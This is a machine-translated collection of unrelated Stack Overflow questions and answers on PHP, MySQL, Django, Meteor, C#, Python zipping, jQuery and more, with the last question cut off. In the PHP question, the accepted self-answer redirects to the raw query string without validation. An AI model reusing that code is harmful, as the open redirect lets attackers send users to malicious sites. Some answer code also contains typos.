> 标签：opencv, camera, video-processing, affinetransform

为了正确表示摄像机运动特征，我必须在视频中找到不同的摄像机操作（例如缩放、平移、旋转和倾斜）。这些相机操作可以通过基于精细运动模型的系数设置阈值来确定。
参考： [用于 MPEG 视频索引的高效摄像机运动表征](http://ieeexplore.ieee.org/xpl/login.jsp?tp=&arnumber=871569&url=http://ieeexplore.ieee.org/xpls/abs_all.jsp?arnumber=871569)！

下面是运动向量 (u,v) ，一个 2 x 1 矩阵表示为宏块 (x, y) 的位置，一个 2x1 矩阵。(a1, a4) 是另一个 2x1 矩阵， (a2, a3, a, a6) 是一个 2x2 矩阵。

```
row1    u             a2    a3         x            a1
                  = [          ] *  [     ]    + [      ]
row2    v             a5    a6         y            a4

Phi = (a1, a2, a3, a4 , a5, a6)  are the coefficients (parameters) generated after applying Afine Motion Model fitting over MVF (Motion Vector Fields).

Further Camera Operations can easily be defined in terms of these parameters.
Such as,    pan = a1,
            tilt= a4,
            div (zoom)  = 0.5 * (a2 + a6)
     and    rot = 0.5 * (a5 - a3) 
```

所以我的问题是可以使用哪些 OpenCV API/函数来确定这些参数。谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-04T06:46:25.390

我已经找到了这个问题的答案。我们可以使用论文中给出的算法找到这些参数。

“J. Konrad 和 F. Dufaux。改进了 N3 的全局运动估计。ISO/IEC JTC1/SC29/WG11 M3096, 1998。”

谢谢

# javascript - 如何创建带有滚动背景图像的可滚动文本区域？

> ID：11751784
> 
> 赞同：3
> 
> 时间：2012-08-01T02:26:31.410
> 
> 标签：javascript, jquery, css, safari, textarea

我想将背景图像添加到与内容一起滚动的文本区域。我正在专门为移动 Safari 使用 HTML/JavaScript/CSS 编程。

我尝试了各种各样的事情，但似乎没有任何效果。我尝试将 textarea 放在图像顶部，然后在滚动 textarea 时滚动背景图像。当我输入文本时，它或多或少地工作得很好，但是本机滚动条（我不想摆脱它）使它在移动 Safari 上看起来很糟糕。

我尝试使用 contentEditable div 容器，但这似乎也引发了问题（再次与滚动）。

是否可以有一个带有本机滚动的文本区域和一个滚动的背景图像？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T02:30:58.100

背景图像可以应用于输入或文本元素，如下所示：

[检查小提琴jsfiddle](http://jsfiddle.net/swamimayank/XxZ8h/)

html

```
<div class="outer">
     <textarea></textarea>
  </div> 
```

css

```
.outer { width: 310px; height: 250px; padding: 5px; border: 1px solid #666; -webikit-border-radius: 3px; -moz-border-radius: 3px; overflow:auto;overflow-x:hidden  }

textarea{
    background: #fff url('http://www.toddle.com/images/300_words_background.gif') 0 -220px no-repeat;
    width: 302px;padding:5px; height:99em;
} 
```

**注意：**两者的区别在于 div 中的内容（假设编码正确）将作为搜索引擎可用的文本包含在内，而 textarea 内容则不会。

# php - IE/Firefox 中关于 $_SERVER['QUERY_STRING'] 的奇怪行为

> ID：11751788
> 
> 赞同：1
> 
> 时间：2012-08-01T02:27:39.213
> 
> 标签：php, internet-explorer, redirect

在我一直在编码的基于 php 的应用程序中，我有以下一小段代码：

```
if (isset($_SERVER['QUERY_STRING'])) {
    header("Location: " . $_SERVER['QUERY_STRING']);
} 
```

在我的应用程序中，我使用框架集和框架。此代码存在于主要内容区域框架中，并且在 IE 中执行时，会创建一个无限循环，除非我手动停止加载，否则会终止浏览器。

此代码的目的是检测是否有附加到 url 的查询字符串，如果有，则重定向到该查询字符串。我主要使用 chrome 和~~firefox~~进行开发，今天决定在 IE9 中进行测试。我没有在任何以前的版本中测试过它，但到目前为止，这种行为只发生在 IE 中，坦率地说，我很难理解为什么会发生这种情况。我在这里和互联网上搜索过类似的问题，但到目前为止还没有骰子。

**编辑**

正如我在之前的编辑中提到的，我使用框架集和框架来控制界面。左边的框架，一个侧边栏，包含与主“内容”区域框架的基本目标的链接。内容区域框架的内容包含将查询字符串附加到父窗口的 url 的 javascript，以便在访问索引页面时（存在查询字符串），它将内容框架重定向到该特定页面。

这在 Chrome 中运行良好。不是 IE（或 firefox，我在本次编辑时才发现）。即重定向到索引页面，包含框架集的页面，它永远这样做，在侧边栏之后创建侧边栏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T02:33:44.317

Try the following:

```
session_start();

if ( !isset($_SESSION['Redirect'] ) && isset( $_SERVER['QUERY_STRING'] ) ) {
    $_SESSION['Redirect'] = true;
    header( "Location: " . $_SERVER['QUERY_STRING'] );
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-01T02:55:36.677

我不知道这是否是您的问题，但根据 HTTP/1.1，重定向需要**完整的绝对路径，包括 hostname**。所以也许试试这个：

```
<?php
/* Redirect to a different page in the current directory that was requested */
$host  = $_SERVER['HTTP_HOST'];
$uri   = rtrim(dirname($_SERVER['PHP_SELF']), '/\\');
$extra = $_SERVER['QUERY_STRING'];
header("Location: http://$host$uri/$extra");
exit;
?> 
```

或者另一个建议是避免使用完整的查询字符串（如`?thispage.php`），而是使用 GET 参数（如`?path=thispage.php`）。

```
<?php
/* Redirect to a different page in the current directory that was requested */
$host  = $_SERVER['HTTP_HOST'];
$uri   = rtrim(dirname($_SERVER['PHP_SELF']), '/\\');
$extra = $_GET['page'];
header("Location: http://$host$uri/$extra");
exit;
?> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-01T02:57:51.180

我有点讨厌自己没有早点想到这个，考虑到它是多么简单。我所做的只是检查是否`$_SERVER['QUERY_STRING']`为空，如下所示：

```
if (isset($_SERVER['QUERY_STRING']) && $_SERVER['QUERY_STRING'] != '') {
    header("Location: " . $_SERVER['QUERY_STRING']);
} 
```

这解决了索引页面创建无限嵌套框架集和框架的问题。

# meteor - 在 Meteor 中，如何以不同的名称发布一个服务器端 mongo 集合？

> ID：11751790
> 
> 赞同：5
> 
> 时间：2012-08-01T02:27:41.710
> 
> 标签：meteor

我有一个名为 Profiles 的服务器端 mongo 集合。

如果用户：adminId，我需要发布和订阅整个配置文件集合。

这样管理员就可以编辑、更新等...每个配置文件集合项。

但我希望用户能够看到他们的个人资料记录。

所以我尝试了这个...

客户端

```
MyProfile = new Meteor.Collection("myprofile");
Meteor.subscribe('profiles');
Meteor.subscribe('myprofile'); 
```

通用 - 客户端和服务器端

```
Profiles = new Meteor.Collection("profiles"); 
```

服务器端 - 配置文件的发布和订阅工作正常。

```
// this returns all profiles for this User
// if they belong to an ACL Group that has acl_group_fetch rights
Meteor.publish("profiles", function() { 
    var user_groups = Groups.find({users: this.userId()});
    var user_groups_selector = [];
    user_groups.forEach(function (group) {
       user_groups_selector.push(group._id);
    });
    return Profiles.find( {
       acl_group_fetch: {
          $in: user_groups_selector
        } 
    });
}); 
```

这是问题似乎开始的地方。Profiles.find 正在返回集合项，因为我可以将它们输出到控制台服务器端。但由于某种原因，发布和订阅不起作用。客户什么也没收到。

```
//  return just the users profile as myprofile
Meteor.publish("myprofile", function() {
  return  Profiles.find({user: this.userId()});
}); 
```

任何想法我做错了什么。我希望能够发布用户 A 可以插入、获取、更新、删除但用户 B（C、D 和 E）只能看到他们的记录的记录集合。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T17:09:18.983

我不完全确定您如何检查错误，但我认为您可能遇到了我遇到的问题。当您使用 Profiles 集合发布数据时，即使 pub/sub 调用使用“myprofile”名称，数据始终在您为其返回游标的集合中可用......在这种情况下，您的数据在“myprofile”发布中发布将显示在客户端的“profiles”集合中。发布调用不会在客户端上创建“myprofile”集合。因此，如果您尝试在“myprofile”集合上查找（），您将看不到任何数据。（Meteor/MongoDB 不会抱怨该集合不存在，因为它们总是会在您引用它时懒惰地创建它。）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-01T05:37:19.403

I think your issue is more on the MongoDB side than with meteor. Given your case I'd do two collections (Group and Profile).

Each document in the Group collection would feature an array containing **DBRefs** to documents in the Profile collection (actually users so I would think about renaming the Profile collection to User as imo that's more intuitive).

Same for the Profile collection and its documents; each document in the profile collection (representing a user) would have an array field containing DBrefs to groups the user belongs to (documents inside the Group collection).

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-01T02:56:23.460

我认为这里的问题是您只需要一个集合：`Profiles`.

所以如果你只是删除有问题的行

```
MyProfile = new Meteor.Collection("myprofile"); 
```

一切都应该正常工作（您将在集合中拥有两个数据`Profiles`集）。

# mysql - 使用 InnoDB，我怎样才能收回索引空间？

> ID：11751792
> 
> 赞同：3
> 
> 时间：2012-08-01T02:28:26.797
> 
> 标签：mysql, indexing, innodb, diskspace

我有一些大型 InnoDB 数据库，接近 1TB。

为了在使用替代存储时释放一些空间，我删除了一些未使用的 InnoDB 索引，希望它可以释放一些空间。

它什么也没释放。

由于它是 InnoDB，引擎会使用分配的空空间进行进一步的插入和索引吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-09-04T21:11:14.673

## 在这里回答：[https ://stackoverflow.com/a/8932289/82114](https://stackoverflow.com/a/8932289/82114)

如果您不使用 innodb_file_per_table，则可以回收磁盘空间，但非常乏味，并且需要大量停机时间。

“如何”可以在这里找到：http: [//dev.mysql.com/doc/refman/5.6/en/innodb-data-log-reconfiguration.html](http://dev.mysql.com/doc/refman/5.6/en/innodb-data-log-reconfiguration.html)

请务必在转储中保留架构的副本。

> 目前，您无法从系统表空间中删除数据文件。要减小系统表空间大小，请使用以下过程：
> 
> 使用 mysqldump 转储所有 InnoDB 表。
> 
> 停止服务器。
> 
> 删除所有现有的表空间文件，包括 ibdata 和 ib_log 文件。如果要保留信息的备份副本，请在删除 MySQL 安装中的文件之前将所有 ib* 文件复制到另一个位置。
> 
> 删除 InnoDB 表的任何 .frm 文件。
> 
> 配置一个新的表空间。
> 
> 重新启动服务器。
> 
> 导入转储文件。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-01T05:10:23.113

InnoDB 将数据存储在表空间中。默认情况下，只有一个表空间，所有数据库的数据都存储在一个文件中。该文件中包含数据字典、表和索引。有一个全局参数`innodb_data_file_path`定义了这个表空间文件。它的语法类似于`ibdata1:256M:autoextend`，这意味着在开始时将创建一个大小为 256 MB 的文件，然后每当数据大小超过此大小时，该文件将自动扩展。该`innodb_autoextend_increment`变量以 MB 为单位定义每个增量应该是多少。

**您将如何获得您的索引空间？**

您应该首先备份所有 InnoDB 表并更改`my.ini/my.cnf`as中的设置`innodb_file_per_table`并重新启动 MySQL 服务器。现在导入这些表，现在每个表都有自己的表空间，可以在删除表时缩小大小。

**这些是可能的解决方法：**

*   每个表单独文件：InnoDB 提供了这个选项，其中每个表的数据（数据 + 索引）可以通过全局变量 innodb_file_per_table 存储在单独的文件中。
*   固定表空间大小：解决表空间文件大小问题的一种方法是将表空间大小（删除自动扩展）固定为外推值。所以，当你达到极限时，你就知道是时候清理了。
*   迁移到 MyISAM：对于所有您认为数据对事务等不是那么重要的表（甚至数据库），将它们迁移到 MyISAM。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-15T15:14:33.527

您应该重新组织 InnoDB 基础架构。为什么？因为 ibdata1 从不缩小。禁用[**innodb_file_per_table**](http://dev.mysql.com/doc/refman/5.5/en/innodb-parameters.html#sysvar_innodb_file_per_table)后，它会迅速膨胀ibdata1吗？除了数据和索引，ibdata1 中还有什么？

*   数据字典
*   双写缓冲区（处理后台页面写入）
*   插入缓冲区（andles 对二级索引的更改）
*   回滚段
*   撤消表空间

话虽如此，您需要将数据迁移出去，删除所有 InnoDB 中继文件，然后重新加载两件事：

*   已启用 innodb_file_per_table
*   更大的事务日志

我在 2010 年 10 月 29 日写了如何做到这一点：[Howto: Clean a mysql InnoDB storage engine?](https://stackoverflow.com/questions/3927690/howto-clean-a-mysql-innodb-storage-engine/4056261#4056261)

展望未来，您可以缩小单个 InnoDB 表。例如，要缩小 mydb.mytable：

```
ALTER TABLE mydb.mytable ENGINE=InnoDB; 
```

# django - 仅将 django 模型对象的一项转换为 json

> ID：11751805
> 
> 赞同：3
> 
> 时间：2012-08-01T02:29:51.380
> 
> 标签：django, json, django-models

我有一个带有 3 个字段的**模型 Y。**在这个模型 Y 中，我有 5 个条目。

我知道我可以使用：

```
from django.core import serializers

def aMethodThatReturnsJson():
    return HttpResponse(serializers.serialize("json", Y.objects.all())) 
```

这将返回正确的 json 响应。

但是当我将方法更改为仅从模型返回 1 行时，如下所示，我得到 Model Y is not iterable 错误：

```
def returnOnlyOneRow():
    return HttpResponse(serializers.serialize("json", Y.objects.get(pk=1))) 
```

为什么这不返回正确的 json 对象？正确的方法是什么？

谢谢。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-08-01T18:15:41.257

这是执行此操作的方法：

```
from django.core import serializers

def return_only_one_row():
    return HttpResponse(serializers.serialize("json", Y.objects.filter(pk=1))) 
```

使用`filter()`而不是`get()`返回正确的 JSON 响应。

另一种方法是使用 Python 列表。您可以包装查询`[ ]`以将结果响应转换为列表，然后将其序列化为 JSON。示例如下：

```
def return_only_one_row():
    return HttpResponse(serializers.serialize("json", [Y.objects.get(pk=1)])) 
```

# spring - How to inject current user in the Hibernate rev Entity

> ID：11751806
> 
> 赞同：1
> 
> 时间：2012-08-01T02:30:19.490
> 
> 标签：spring, hibernate, spring-data, hibernate-envers

I used Spring 3.1, JPA 2 and Spring Data JPA(Hibenrate 4.1) in my project, and used Hibernate Envers(shipped with Hibernate 4) to audit some properties, I want to store the current logged in user in the related rev table, how to implement this? Thanks.

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-01T05:15:31.593

您将需要创建自定义 Envers 列表器，如下所示

```
public class CustomEnversListener implements RevisionListener {
@Override
    public void newRevision(Object revisionEntity) {
       CustomRevisionEntity customRevisionEntity = (customRevisionEntity)revisionEntity;
       Authentication authentication = SecurityContextHolder.getContext().getAuthentication();
       customRevisionEntity.setUsername(authentication.getName());
    }
} 
```

有关更多信息，请查看 hibernate [wiki](https://community.jboss.org/wiki/MyExperienceWithHibernateEnvers-AuditTrail)

# c# - How to play all words using narrator?

> ID：11751812
> 
> 赞同：1
> 
> 时间：2012-08-01T02:31:18.057
> 
> 标签：c#, winforms, soundplayer

my project is text to speech project, here is my code,

```
string amma = myacess.Text;
// string[] words = Regex.Split(amma,"*");
char[] delimeter = new char[] { '*' };
string[] words = amma.Split(delimeter, StringSplitOptions.RemoveEmptyEntries);
for( int i = 0; i < words.Length; i++ ) {
    string audio = words[i];
    if( audio == "a" ) {
        SoundPlayer sndplayr = new SoundPlayer( WindowsFormsApplication1.Properties.Resources.aa );
        sndplayr.Play();

    }
    if( audio == "u" ) {
        SoundPlayer sndplayr = new SoundPlayer( WindowsFormsApplication1.Properties.Resources.i );
        sndplayr.Play();
    }
} 
```

* * *

but enter text "au" it will play only "u" sound. but I put break point and press F11 then only it's play a sound and u sound. What is the reason behind. please can you help me?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T04:31:49.483

使用[`SoundPlayer.PlaySync`方法](http://msdn.microsoft.com/en-us/library/system.media.soundplayer.playsync.aspx)而不是`SoundPlayer.Play`. 这样，您可以在上一个声音结束后开始下一个声音。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-01T03:59:41.510

> 但是我放了断点并按F11然后它只会播放声音和你的声音。背后的原因是什么。你能帮帮我吗？

我认为问题在于for循环太快了。

因此，您可以通过这种方式使用[`Timer`](http://msdn.microsoft.com/it-it/library/system.windows.forms.timer.aspx)(System.Windows.Forms.Timer)：

```
private Timer timer;
private int i; 
```

* * *

```
string amma = myacess.Text;
// string[] words = Regex.Split(amma,"*");
char[] delimeter = new char[] { '*' };
string[] words = amma.Split(delimeter, StringSplitOptions.RemoveEmptyEntries);

//...

timer = new Timer();
timer.Interval = 100; //milliseconds 
timer.Tick = += new EventHandler(timer_Tick);
timer.Enabled = true; //start the timer

i = 0; 
```

* * *

```
void timer_Tick(object sender, EventArgs e){
    if(i < word.Lenght){
       string audio = words[i];
       if( audio == "a" ) {
           SoundPlayer sndplayr = new SoundPlayer( WindowsFormsApplication1.Properties.Resources.aa );
           sndplayr.Play();   
       }
       if( audio == "u" ) {
           SoundPlayer sndplayr = new SoundPlayer( WindowsFormsApplication1.Properties.Resources.i );
           sndplayr.Play();
       }

       i++; //increase i to change letter like in the loop
    }
    else{
       timer.Enabled = false; //stop the timer
       i = 0;
    }
} 
```

# asp.net - ASHX seems run more than one time

> ID：11751813
> 
> 赞同：1
> 
> 时间：2012-08-01T02:31:35.810
> 
> 标签：asp.net, .net, ashx

I have an ashx to do some sync work; it usually takes about 8 minutes. When the sync finishes, an email will be sent to admin. But when I run that ashx in browser, it keeps on loading forever after it finishes, so that admin gets more than one email.

Can anyone give me some information about why this happens?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T04:35:43.893

如果处理程序没有向响应返回数据，则浏览器可能正在尝试再次请求，直到获得成功状态。在这种情况下，您可以尝试响应任何文本以获取成功：

```
context.Response.StatusCode = 200;
context.Response.ContentType = "text/plain";
context.Response.Write(string.Empty); 
```

但是，如果处理程序正在向响应返回数据并且响应状态码是成功的，您可以尝试在发送电子邮件后立即停止响应：

```
context.Response.End();
return; 
```

并且，只是为了检查，验证您是否正在迭代一个多次调用邮件发送的循环。

# jsp - JSP to run OS commands

> ID：11751814
> 
> 赞同：0
> 
> 时间：2012-08-01T02:31:52.470
> 
> 标签：jsp, shell

Can I use JSP to run OS commands ?

I have done similar thing in PHP and works fine using the shell_exec syntax.

Is it possible to do it in JSP ?

I was looking for something similar like this .

```
<?php
$output = shell_exec('ls -lart');
echo "<pre>$output</pre>";
?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T02:44:46.687

```
Runtime.exec(String s) 
```

不确定你想要什么，本质上你是在问如何在 java 中运行 os 命令。[参考这篇文章](https://stackoverflow.com/questions/11718124/run-cmd-line-in-java-fails)

而在 JSP 中，有更多的限制，出于安全考虑，您可能无法访问位于沙箱（即 Web 容器）之外的文件。

# c# - Sitecore: User Controls not rendering when used alone, but renders as a sublayout

> ID：11751820
> 
> 赞同：1
> 
> 时间：2012-08-01T02:33:02.050
> 
> 标签：c#, user-controls, sitecore, sitecore6, sublayout

I have a user control that i have registered in the web.config and i'm using in another user control.

the structure looks like this

*   Base layout
    *   home sublayout
        *   feature user control 1
        *   feature user control 2

when i use the user control as a user control

`<ns:feature id="x" runat="server" visible = true/>`

the code behind gets hit, but the mark up is never embedded on the page.

if i use it as a sublayout however

`<sc:Sublayout ID="x" runat="server" path="/sublayouts/feature.ascx"/>`

this renders perfectly fine and i get all the markup.

am i missing some configuration setting? I could use them all as sublayouts, but i'm just curious why it is not working. This is the first time i'm setting up sitecore myself, previously i'v always worked on existing projects.

*update I registered the user control directly on the home sublayout's ascx file and that fixed it. Just realized any user control i use that has been registered in the web.config pointing to the project's own assembly isint working.

# python - 如何使用 Python 创建文件路径的 zip 文件，包括空目录？

> ID：11751822
> 
> 赞同：6
> 
> 时间：2012-08-01T02:33:23.800
> 
> 标签：python, zip, zipfile, shutil

我一直在尝试使用`zipfile`and`shutil.make_archive`模块递归地创建目录的 zip 文件。两个模块都工作得很好——除了空目录不会被添加到存档中。包含其他空目录的空目录也会被静默跳过。

我可以使用 7Zip 创建相同路径的存档并保留空目录。因此我知道这在文件格式本身是可能的。我只是不知道如何在 Python 中做到这一点。有任何想法吗？谢谢！

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-08-01T02:55:15.380

有一个使用 zipfile 的示例：

```
import os, zipfile  
from os.path import join  
def zipfolder(foldername, filename, includeEmptyDIr=True):   
    empty_dirs = []  
    zip = zipfile.ZipFile(filename, 'w', zipfile.ZIP_DEFLATED)  
    for root, dirs, files in os.walk(foldername):  
        empty_dirs.extend([dir for dir in dirs if os.listdir(join(root, dir)) == []])  
        for name in files:  
            zip.write(join(root ,name))  
        if includeEmptyDIr:  
            for dir in empty_dirs:  
                zif = zipfile.ZipInfo(join(root, dir) + "/")  
                zip.writestr(zif, "")  
        empty_dirs = []  
    zip.close() 

if __name__ == "__main__":
    zipfolder('test1/noname/', 'zip.zip') 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-01T02:54:14.807

您需要[注册一种新的存档格式](http://docs.python.org/library/shutil.html#shutil.register_archive_format)来执行此操作，因为默认的 ZIP 存档程序不支持该格式。看看[现有 ZIP 归档器的内容](http://hg.python.org/cpython/file/8f1a8e80f330/Lib/shutil.py#l449)。制作您自己的存档器，使用该当前未使用的`dirpath`变量创建目录。我寻找如何创建一个空目录并找到[了这个](http://bytes.com/topic/python/answers/19053-add-empty-directory-using-zipfile#edit73291)：

```
zip.writestr(zipfile.ZipInfo('empty/'), '') 
```

有了它，您应该能够编写必要的代码来使其归档空目录。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-19T11:54:41.203

这是从[使用 python 将文件夹添加到 zip 文件中提取](https://stackoverflow.com/questions/458436/adding-folders-to-a-zip-file-using-python/792199#792199)的，但这是我尝试过的唯一有效的功能。作为答案列出的那个在 Python 2.7.3 下不起作用（不复制空目录并且效率低下）。以下是经过试验和测试的：

```
#!/usr/bin/python
import os
import zipfile

def zipdir(dirPath=None, zipFilePath=None, includeDirInZip=True):

    if not zipFilePath:
        zipFilePath = dirPath + ".zip"
    if not os.path.isdir(dirPath):
        raise OSError("dirPath argument must point to a directory. "
        "'%s' does not." % dirPath)
    parentDir, dirToZip = os.path.split(dirPath)
    #Little nested function to prepare the proper archive path
    def trimPath(path):
        archivePath = path.replace(parentDir, "", 1)
        if parentDir:
            archivePath = archivePath.replace(os.path.sep, "", 1)
        if not includeDirInZip:
            archivePath = archivePath.replace(dirToZip + os.path.sep, "", 1)
        return os.path.normcase(archivePath)

    outFile = zipfile.ZipFile(zipFilePath, "w",
        compression=zipfile.ZIP_DEFLATED)
    for (archiveDirPath, dirNames, fileNames) in os.walk(dirPath):
        for fileName in fileNames:
            filePath = os.path.join(archiveDirPath, fileName)
            outFile.write(filePath, trimPath(filePath))
        #Make sure we get empty directories as well
        if not fileNames and not dirNames:
            zipInfo = zipfile.ZipInfo(trimPath(archiveDirPath) + "/")
            #some web sites suggest doing
            #zipInfo.external_attr = 16
            #or
            #zipInfo.external_attr = 48
            #Here to allow for inserting an empty directory.  Still TBD/TODO.
            outFile.writestr(zipInfo, "")
    outFile.close() 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2019-11-22T03:35:07.433

```
def zip_dir(src_dir, dst_zip, *, skip_suffixes=None, dry=False):
    import logging
    from pathlib import Path
    from os import walk
    from tempfile import TemporaryDirectory
    from zipfile import ZipFile, ZipInfo

    _log = logging.getLogger(zip_dir.__name__)
    _log.addHandler(logging.NullHandler())
    _sep = 50 * "-"

    skip_suffixes = skip_suffixes or []
    src_dir, dst_zip = Path(src_dir), Path(dst_zip)
    _log.info("zipping dir: '%s' to: '%s", str(src_dir), str(dst_zip))

    if not src_dir.exists():
        raise FileNotFoundError(str(src_dir))
    if not src_dir.is_dir():
        raise NotADirectoryError(str(src_dir))
    if dst_zip.exists():
        raise FileExistsError(str(dst_zip))

    with TemporaryDirectory() as tmp_dir:
        tmp_zip_path = Path(tmp_dir).joinpath(dst_zip.name)

        with ZipFile(str(tmp_zip_path), mode="w") as zip_out:
            for root, dirs, files in walk(src_dir):
                root = Path(root)

                for folder in dirs:
                    folder = root.joinpath(folder)

                    # add empty folders to the zip
                    if not list(folder.iterdir()):
                        _log.debug(_sep)
                        folder_name = f"{str(folder.relative_to(src_dir))}/"
                        _log.debug("empty dir: '%s'", folder_name)

                        if dry:
                            continue

                        zip_out.writestr(ZipInfo(folder_name), "")

                for file in files:
                    file = root.joinpath(file)
                    _log.debug(_sep)
                    _log.debug("adding:  '%s'", str(file))

                    should_skip = None
                    for suffix in file.suffixes:
                        if suffix in skip_suffixes:
                            should_skip = suffix
                            break

                    if should_skip:
                        _log.debug("skipped [%s]: %s", should_skip, str(file))
                        continue

                    arcname = str(file.relative_to(src_dir))
                    _log.debug("arcname: '%s'", arcname)

                    if dry:
                        continue

                    zip_out.write(str(file), arcname=arcname)

        if not dry:
            dst_zip.write_bytes(tmp_zip_path.read_bytes())

        tmp_zip_path.unlink()

if __name__ == '__main__':
    import logging
    logging.basicConfig(level=logging.DEBUG, format="%(asctime)s | %(levelname)8s | %(module)25s:%(lineno)-5s | %(message)s")

    zip_dir("/tmp/opera_profile", "opera_profile.zip", skip_suffixes=[".log"], dry=True) 
```

# django - Django Celery - 重试后如何执行功能

> ID：11751825
> 
> 赞同：1
> 
> 时间：2012-08-01T02:33:35.680
> 
> 标签：django, celery, django-celery

我在我的任务`on_failure`中添加了一些代码来删除一个对象。我的意图是在最大重试次数发生后删除对象，但`on_failure`每次方法失败时调用一次`run`，而不是在所有重试失败后调用。是否有其他地方可以放置这种功能（例如，`def after_exhaustion(...)`）。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-01T08:57:38.127

任务[上下文](http://celery.github.com/celery/userguide/tasks.html#context)有一个**重试**字段，它是任务已重试的次数。您可以使用它来确定何时删除您的对象。

# javascript - 创建具有输入和标签的嵌套 div，然后在输入上分配事件的最佳方法是什么？

> ID：11751828
> 
> 赞同：0
> 
> 时间：2012-08-01T02:34:16.620
> 
> 标签：javascript, jquery, html, dom

我想动态创建一个 div，然后在该 div 中创建一个标签和输入，然后将事件处理程序（使用 jQuery 的 $.on() 函数）分配给输入元素。什么是创建元素和分配事件的好方法？我正在使用最新版本的 jQuery。谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-01T02:36:48.863

```
var
$div = $('<div/>', { 'class': 'myclass', click: function(){ ... } }),
$label = ...,
$input = ...

$div.append($label.add($input)).insertAfter('#el') 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-01T11:51:32.867

我已经完成了上述解决方案的完整解决方案，这里是演示链接：

**演示：** [http ://codebins.com/bin/4ldqp91](http://codebins.com/bin/4ldqp91)

**HTML**

```
<div id="panel">
  <input type="button" id="btnadd" name="btnadd" value="Add Div" />
  <input type="button" id="btnreset" name="btnreset" value="Reset" />
  <br/>
</div> 
```

** CSS：**

```
input[type=button]{
  border:1px solid #2233fd;
  background:#2288cb;
  margin-bottom:10px;
}
input[type=button]:hover{
  background:#22abde;
}
.mydiv{
  border:1px solid #2255aa;
  padding:5px;
  margin-bottom:7px;
  font-size:13px;
  background:#2275bd;
}
.mydiv input{
  border:1px solid #333;
}
.mydiv label{
  color:#fdf889;
}
.val{
  display:inline-block;
  margin-left:8px;
  color:#bcfaac;
} 
```

**jQuery：**

```
$(function() {
    var i = 0;
    $("#btnadd").click(function() {
        if ($("#panel").find("div.mydiv").length) {
            i = $("#panel").find("div.mydiv").length;
        }
        $("#panel").append("<div id='div-" + i + "' class='mydiv'></div>");

        $("div.mydiv:last").append("<label>Enter Value:</label>");
        $("div.mydiv:last").append("<input type='text' name='txt" + i + "' id='txt" + i + "' size='20'/><span class='val'></span>");

        //bind Blur Event
        $("div.mydiv:last").find("input[type=text]").on('blur', function() {
            if ($(this).val() != "") {
                $(this).parents(".mydiv").find("span.val").html("This Input Contains Value: \"" + $.trim($(this).val()) + "\"");
            } else {
                $(this).parents(".mydiv").find("span.val").html("This Input has been left empty..!");
            }

        });

        i++;

    });
   //Reset List
    $("#btnreset").click(function() {
        $("div.mydiv", $("#panel")).remove();
    });
}); 
```

将事件与元素绑定的另一种替代方法如下：

首先，您必须制作要绑定的功能。

```
function bindTextbox(){
   if ($(this).val() != "") {
                    $(this).parents(".mydiv").find("span.val").html("This Input Contains Value: \"" + $.trim($(this).val()) + "\"");
                } else {
                    $(this).parents(".mydiv").find("span.val").html("This Input has been left empty..!");
                }
} 
```

在上面的jQuery脚本上的注释//bind Blur Event下面写下面的行脚本

```
$("div.mydiv:last").find("input[type=text]").bind('blur','bindTextbox'); 
```

而不是以下代码行：

```
 $("div.mydiv:last").find("input[type=text]").on('blur', function() {
     if ($(this).val() != "") {
                    $(this).parents(".mydiv").find("span.val").html("This Input Contains Value: \"" + $.trim($(this).val()) + "\"");
      } else {
                    $(this).parents(".mydiv").find("span.val").html("This Input has been left empty..!");
      }
 }); 
```

**演示：** [http ://codebins.com/bin/4ldqp91](http://codebins.com/bin/4ldqp91)

# c# - How to check if UDP port is open or closed

> ID：11751829
> 
> 赞同：1
> 
> 时间：2012-08-01T02:34:25.297
> 
> 标签：c#

I want to iterate UDP port from 5000 to 50xx

How can I check if a specific port is already open or free to use?

I use this code but it always returns false:

```
public bool PortIsUsed(int myport)
{
   bool alreadyinuse = (from p in System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().GetActiveUdpListeners() where p.Port == myport select p).Count() == 1;
   return alreadyinuse;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T03:09:35.120

通常在请求共享资源（例如 UDP 端口号）时，会询问“这现在可用吗？” 没有生产力。无论您得到哪个答案，都可能在下一微秒内变得不正确，因为另一个应用程序可能会更改使答案无效的内容。

您可以做的是让操作系统侦听特定端口（“获取”资源）。操作系统会说*yes*，这是一个句柄或其他什么，或者*no*，其他一些进程正在使用该特定端口。无论哪种方式，您都会得到一个可以明确采取行动的答案。（具体来说，如果您得到*否定*的答案，请尝试不同的端口。）

# c# - Overlapping Book-Page Range

> ID：11751830
> 
> 赞同：0
> 
> 时间：2012-08-01T02:34:53.577
> 
> 标签：c#

I have a set of `Book-Page(6794-47)` range. Please note that page limit is not confirm.

Now I want to check the overlapping of book page range in multiple range list

Please check below example.

Below is my parameter range.

```
Start Book-Page Range ---- (21205-41) 

End Book-Page Range ---- (21206-1674)

```

and want to extract the overlapped ranges from a range list Range List e.g

```
---------------------------------------------------------------------------------
